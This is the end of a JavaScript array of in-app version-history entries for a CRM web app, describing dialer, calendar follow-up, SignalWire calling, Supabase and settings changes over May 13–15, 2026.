  { date:'2026-05-15', time:'19:00', name:'Follow-ups — Call/SMS/Email type picker (round monochrome icons)', area:'Calendar, Dialer, Contacts', description:'The Schedule a follow-up modal now has 3 round monochrome icon buttons — Call, SMS, Email — so you can tag what kind of follow-up it is. Tap again to clear (optional). The chosen type is persisted on the calendar_events row (new `followup_type` column) and shown as a small circular chip next to every follow-up everywhere it appears: the Calendar sidebar Follow-ups panel, the View all popup, and the contact card Activity-tab list. Icons are simple line SVGs (stroke=currentColor) — no colorful emoji.', commit:'8371714' },
  { date:'2026-05-15', time:'18:30', name:'Calendar — 5-row cap with scroll + View all popup', area:'Calendar', description:'The Follow-ups and Upcoming Events panels on the Calendar sidebar now cap height at ~5 items so the sidebar stays tidy; the panel itself scrolls if there are more. A "View all (N)" footer button appears only when count > 5 and opens a popup with the complete list in a taller scroll area. Same item rendering on both surfaces — clicking a follow-up opens the scheduler, clicking another event opens the editor.', commit:'cd327e5' },
  { date:'2026-05-15', time:'18:00', name:'Calendar — dedicated Follow-ups calendar source; Info-tab section removed', area:'Calendar, Contacts, Dialer', description:'Every scheduled follow-up now lives on a new built-in "Follow-ups" calendar (green chip, default-active) instead of mixing into the generic "CRM Events" calendar. Disposition follow-ups, contact-card scheduler, and Conversations Quick Action all route to `sourceId="followups"`. The Calendar sidebar Follow-ups panel and the contact\'s Activity-tab Follow-ups list both detect by source first, with a title-prefix fallback for any pre-migration rows. Removed the Follow-ups section from the contact card\'s Info tab — follow-ups now live solely on the Activity tab there. Existing rows in Supabase were migrated to the new source.', commit:'334c69a' },
  { date:'2026-05-15', time:'17:15', name:'Calendar — fix missing calendar_events table (DB)', area:'Calendar, Dialer, Database', description:'Root cause for calendar events / follow-ups never persisting across page refresh: the Supabase `calendar_events` table did not exist. `saveCalEvents()` was POST-ing to a 404 and the error was being swallowed silently by a try/catch — events lived in memory only, then vanished on reload. Created the table in Supabase (id text PK, title, start_time/end_time timestamptz, source_id, notes, contact_id uuid FK→contacts with ON DELETE SET NULL, gcal_id/gcal_link/meet_link, created_at) with an RLS policy matching `public.contacts` (any authenticated user, full access). Also stopped `saveCalEvents()` from swallowing errors — failures now surface as a toast so a regression like this can\'t hide.', commit:'3996658' },
  { date:'2026-05-15', time:'16:30', name:'Follow-ups everywhere — contact card, conversations, click-to-edit', area:'Calendar, Contacts, Conversations, Dialer', description:'A unified follow-up flow across the CRM. New "📅 Schedule Follow-up" buttons on the contact detail panel (Info + Activity tabs) and in the Conversations sidebar Quick Actions, all opening one reusable scheduler modal with the fixed 12-hour AM/PM date picker. Each contact\'s open follow-ups are listed inline on their card and on the Activity tab. Items are clickable — opens the same modal in edit mode with Save / Cancel / Delete. Scheduling, editing, or deleting a follow-up now also writes a `📅 Follow-up scheduled/rescheduled/cleared …` entry to the contact\'s notes timeline (so it surfaces wherever the contact appears). Calendar Follow-ups list now opens the dedicated scheduler instead of the generic event editor.', commit:'bc9f8ac' },
  { date:'2026-05-15', time:'15:50', name:'Date picker — fix day-cell click closing the picker', area:'Calendar, Dialer', description:'Picking a date in the Call Disposition follow-up scheduler instantly closed the picker without selecting. Clicking a day re-renders the popup\'s innerHTML, which detaches the clicked cell from the DOM; the document-level outside-click handler then saw a "click outside the popup" because the original node was now orphaned. Switched that listener to capture-phase so the inside-popup check runs BEFORE the re-render. You can now click any future (or past) date freely.', commit:'adbff7b' },
  { date:'2026-05-15', time:'15:20', name:'Date picker — fix clipping in modals + 12-hour AM/PM', area:'Calendar, Dialer', description:'Two fixes to the custom date/time picker. (1) The "Schedule a follow-up" button in the Call Disposition modal opened the picker but it was hidden — the popup was being clipped by the modal\'s scroll container. The picker is now body-anchored with fixed positioning so it can\'t be clipped by any parent, and auto-flips above the anchor when there isn\'t room below. (2) The hour selector is now a 12-hour clock with a separate AM/PM dropdown instead of a 24-hour 00–23 list.', commit:'b00f85b' },
  { date:'2026-05-15', time:'14:00', name:'Calendar — Follow-ups panel, real contact filter, US Holidays', area:'Calendar', description:'Calendar sidebar now has a dedicated "Follow-ups" section listing future Follow-up events from the Call Disposition flow (also still shown under Upcoming Events). "Filter by Contact" now actually filters the month/week/day grid plus the Follow-ups and Upcoming Events lists. Added a built-in "US Holidays" calendar source (all 11 US federal holidays, pre-populated for the previous, current and next two years) — toggle the chip to hide/show holidays on the grid.', commit:'f0dfa33' },
  { date:'2026-05-15', time:'10:45', name:'Call Disposition — schedule a follow-up', area:'Dialer, Calendar', description:'The Call Disposition pop-up now has an optional "Schedule a follow-up" date & time picker. Pick a date and a "Follow-up: <contact>" event is added to the CRM calendar (30 min, linked to the contact, with the disposition and note in the event notes).', commit:'b92aa07' },
  { date:'2026-05-15', time:'10:15', name:'Dialer — Dialing Mode tile', area:'Dialer', description:'Added a "Dialing Mode" tile at the top of the Dialer queue view, above "Calling From". It shows the current mode at a glance — Manual or Auto-advance + auto-dial (with the countdown length) — and clicking it opens the dialer settings to change it.', commit:'b92aa07' },
  { date:'2026-05-15', time:'09:30', name:'Team members — reliable add + per-user permissions', area:'Settings → Team Members', description:'Adding a team member now creates a ready-to-use account instantly (no confirmation email, no rate-limit errors) via a server-side Admin API endpoint, and removing one fully revokes login access. Each non-admin user has four permission toggles — Calling & SMS, Edit contacts & deals, Delete records, Settings & team — that an admin can flip on or off any time. Blocked features are hidden from the sidebar and refuse the action with a clear message.', commit:'b835dc7' },
  { date:'2026-05-14', time:'18:57', name:'Audio devices moved to Settings', area:'Settings, Calling',          description:'Moved microphone and speaker selection out of the floating dialer and into the main Settings page. Device choices now persist locally, with a Refresh Devices button to re-scan browser audio devices.', commit:'2009f03' },
  { date:'2026-05-14', time:'18:40', name:'Dialer - right-side lead context', area:'Dialer',          description:'Moved the Up Next tile and Contact Info panel back to the right side of the Dialer, while Calling From and Call Queue stay together on the left. The layout stacks again on narrower screens.', commit:'6ef34b0' },
  { date:'2026-05-14', time:'07:10', name:'Dialer — vertical layout + disposition notes', area:'Dialer',          description:'Dialer queue view is now a single vertical column (Calling From → Call Queue → Now Calling → Contact Info) instead of a two-column split. The disposition pop-up now has an optional notes box — what you type is saved onto the contact alongside the disposition.', commit:'340e056' },
  { date:'2026-05-14', time:'06:45', name:'Dialer — Contact Info + Notes panel', area:'Dialer',                  description:'Beside the call queue: a Contact Info & Notes panel showing the current lead details (company, status, email, tags, last activity) plus a notes box to jot notes while calling. Notes save straight to the contact — same notes everywhere in the CRM.', commit:'dd3f3fd' },
  { date:'2026-05-14', time:'06:20', name:'Dialer — Call History view',      area:'Dialer',                      description:'New "Call History" tab in the Dialer: every past call with its disposition + date/time, grouped by day under a month navigator (◀ ▶ calendar-style). Click any entry to open the live contact card (edits sync CRM-wide); unmatched numbers redial. Dispositions now attach to their call-history entry.', commit:'b4967dd' },
  { date:'2026-05-14', time:'05:55', name:'Dialer — Numbers + Activity Report', area:'Dialer',                    description:'Added a "Calling From" number picker (shows all SignalWire numbers, pick which to dial from) and a Call Activity report with Today/Week/Month views — Dials Made, Connected, Connect Rate, Talk Time, and a disposition breakdown bar.', commit:'7812230' },
  { date:'2026-05-14', time:'05:15', name:'Dialer — Power Call Queue',       area:'Dialer',                      description:'New Dialer section above Conversations: build a FIFO call queue, dial leads through the browser, log a disposition after each call. Editable dispositions + auto-advance/auto-dial toggle with countdown, all in the Dialer gear ⚙. "📞 Add to Queue" bulk action on Contacts.', commit:'88913b5' },
  { date:'2026-05-14', time:'04:30', name:'Contact Notes Log + Bulk Action Log', area:'Contacts',                description:'Notes are now timestamped entries (Added/Edited stamps, separators, edit & delete) instead of one textarea. New "Bulk Action Log" tab beside All Contacts shows every bulk Export/Tag/Pipeline/Delete/Import — operation, status, user, created & completed times.', commit:'b648537' },
  { date:'2026-05-14', time:'03:55', name:'Pop-ups: No Outside-Click Close',  area:'All modals',                  description:'Pop-up boxes no longer close when you click outside them. Close only via the × button or the Esc key — prevents losing work on an accidental click.', commit:'c4d7505' },
  { date:'2026-05-14', time:'03:40', name:'Contacts: Names, Statuses, Last Activity', area:'Contacts',          description:'Split Full Name into First/Last; gear ⚙ to add/edit/remove Statuses & Sources; new Last Activity column (date+time of last call/email/SMS/profile update) beside Date Added.', commit:'f8151de' },
  { date:'2026-05-14', time:'03:10', name:'Fix Expired Call Token (root cause)', area:'Calling',                description:'Token endpoint was being browser-cached so the stale 2h token kept coming back. Added no-cache headers, cache-buster, 8h expiry, and wrapped call.start() in the retry.', commit:'dff70d1' },
  { date:'2026-05-14', time:'02:55', name:'Call Token Auto-Refresh',         area:'Calling',                     description:'Detect expired SignalWire Fabric subscriber token (authblock_is_expired) and re-init the SDK automatically — calls work indefinitely without page refresh.', commit:'bc984df' },
  { date:'2026-05-13', time:'22:35', name:'Disable Browser Autofill',        area:'All inputs',                  description:'Suppress Chrome/password-manager popups on search and filter inputs; login + account-password fields still autofill normally.', commit:'410749f' },
  { date:'2026-05-13', time:'22:25', name:'Multi-Number Support + Cleanup',  area:'Integrations, SMS',           description:'Add up to 5 SignalWire phone numbers; per-message From picker in SMS compose; deleted dead SIP/click-to-call API files.', commit:'4304b2d' },
  { date:'2026-05-13', time:'22:05', name:'Bulk Contact Actions',            area:'Contacts',                    description:'Select-all + per-row checkboxes; bulk Export, Add/Remove Tag, Move to Pipeline, and Delete with typed confirmation.', commit:'8427382' },
  { date:'2026-05-13', time:'21:50', name:'Version History Tracker',         area:'Settings',                    description:'Added in-app version list with rollback instructions and CHANGELOG file.', commit:'fee2a58' },
  { date:'2026-05-13', time:'21:40', name:'Team Member Safety',              area:'Settings → Team Members',     description:'Removed self-delete option; typed confirmation now required to remove invited team members.', commit:'774d714' },
  { date:'2026-05-13', time:'21:34', name:'Data Usage Dashboard',            area:'Settings',                    description:'Track Supabase storage with per-table breakdown and growth-based recommendations.', commit:'27e46a2' },
  { date:'2026-05-13', time:'21:25', name:'Integrations & Pipeline Refresh', area:'Integrations, Pipeline & Deal', description:'Integration cards collapse — click name to expand; Pipeline Stages moved to a gear-icon modal in Pipeline & Deal.', commit:'b16b0d8' },
  { date:'2026-05-13', time:'21:15', name:'Logo & Favicon Upload',           area:'Settings → Branding',         description:'Upload your agency logo and browser-tab favicon; old sidebar upload button removed.', commit:'aa5e1f5' },
  { date:'2026-05-13', time:'21:06', name:'Tag Filter & Search Polish',      area:'Contacts',                    description:'Moved tag filter to leftmost position; fixed search-icon overlapping the placeholder.', commit:'c04561c' },
  { date:'2026-05-13', time:'20:57', name:'Tag Dropdown Position',           area:'Contacts',                    description:'Adjusted tag filter dropdown anchoring.', commit:'e8c53b4' },
  { date:'2026-05-13', time:'20:52', name:'Sidebar Cleanup',                 area:'Sidebar',                     description:'Removed the unread/count badges from nav items (Contacts, Conversations, Email, Automations).', commit:'bcecbd9' },
  { date:'2026-05-13', time:'20:38', name:'Calls Tab + Sort Toggle',         area:'Conversations',               description:'Added Calls tab integrated with dialer history; newest/oldest sort toggle; reordered tabs to All · SMS · Calls · Email · Unread.', commit:'b42a995' },
  { date:'2026-05-13', time:'20:29', name:'Always-on Dialer During Call',    area:'Dialer',                      description:'Keypad stays visible during calls; prevented accidental double-dialing.', commit:'04d7aab' },
  { date:'2026-05-13', time:'20:23', name:'DTMF Keypad',                     area:'Dialer',                      description:'In-call keypad for navigating IVR menus (press 1, etc.)', commit:'de8f640' },
  { date:'2026-05-13', time:'20:12', name:'Light Theme Toggle',              area:'Settings → Appearance',       description:'Switch between Dark (original) and Light themes; removed sidebar theme switcher.', commit:'1bd2b1f' },
  { date:'2026-05-13', time:'19:34', name:'🎉 Browser Calling Working',       area:'Calling',                     description:'SignalWire Call Fabric v3 — true browser-to-PSTN, no physical phone needed.', commit:'c00b34c', highlight:true },
  { date:'2026-05-13', time:'18:56', name:'Call Flow Debug Logging',         area:'Calling',                     description:'Added step-by-step error logs to diagnose call failures.', commit:'3cc3186' },
  { date:'2026-05-13', time:'18:50', name:'Click-via-SIP Bridge Attempt',    area:'Calling',                     description:'Experiment: SignalWire REST → SIP credential bridge (later replaced by Call Fabric).', commit:'5be660e' },
  { date:'2026-05-13', time:'03:54', name:'JsSIP Attempt',                   area:'Calling',                     description:'Experiment: JsSIP over SIP/WebSocket (failed — incompatible SDP).', commit:'0034ca5' },
  { date:'2026-05-13', time:'03:26', name:'RELAY v2 SDK Attempt',            area:'Calling',                     description:'Experiment: switched to RELAY v2 (BUG-004 — also failed for PSTN).', commit:'a525755' },
  { date:'2026-05-13', time:'03:01', name:'Click-to-Call (Physical Phone)',  area:'Calling',                     description:'REST API bridges your phone to the contact — first working call solution.', commit:'4218ac2' },
  { date:'2026-05-13', time:'01:53', name:'Initial Calling Stack',           area:'Calling',                     description:'Replaced Twilio SDK with @signalwire/js + Fabric token.', commit:'770a27c' },
  { date:'2026-05-13', time:'01:05', name:'JWT Fix + Error Logging',         area:'Calling, Errors',             description:'Fixed initial JWT format issue; built Supabase error_logs table for all frontend + API errors.', commit:'9512e9d' },
];

window.__nlmVersionHistoryLoaded = true;
